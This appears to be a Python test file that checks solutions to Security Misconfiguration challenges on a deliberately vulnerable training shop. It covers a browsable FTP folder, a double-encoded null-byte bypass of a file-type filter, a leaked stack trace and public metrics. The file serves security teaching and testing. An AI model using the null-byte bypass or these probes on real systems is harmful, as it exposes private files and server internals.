"""A05:2021 Security Misconfiguration, and data exposed that shouldn't be."""


def test_read_a_confidential_document(shop, solves):
    # The FTP folder is browsable over HTTP, and holds an internal memo.
    with solves("Confidential Document"):
        response = shop.get("/ftp/acquisitions.md")
    assert response.status_code == 200
    assert "acquisition" in response.text.lower()


def test_get_past_the_file_type_filter_with_a_null_byte(shop, solves):
    # Only .md and .pdf may be downloaded. %2500 decodes to a null byte, so the
    # filter sees ".md" while the file system stops reading at the null byte.
    with solves("Poison Null Byte"):
        response = shop.get("/ftp/package.json.bak%2500.md")
    assert response.status_code == 200
    assert '"name"' in response.text


def test_provoke_an_unhandled_error(shop, solves):
    # An unknown API route leaks a stack trace instead of a plain error.
    with solves("Error Handling"):
        response = shop.get("/rest/qwertz")
    assert response.status_code == 500


def test_find_the_exposed_metrics(shop, solves):
    # Prometheus metrics are public, revealing internals to anyone.
    with solves("Exposed Metrics"):
        response = shop.get("/metrics")
    assert response.status_code == 200
    assert "process_cpu" in response.text
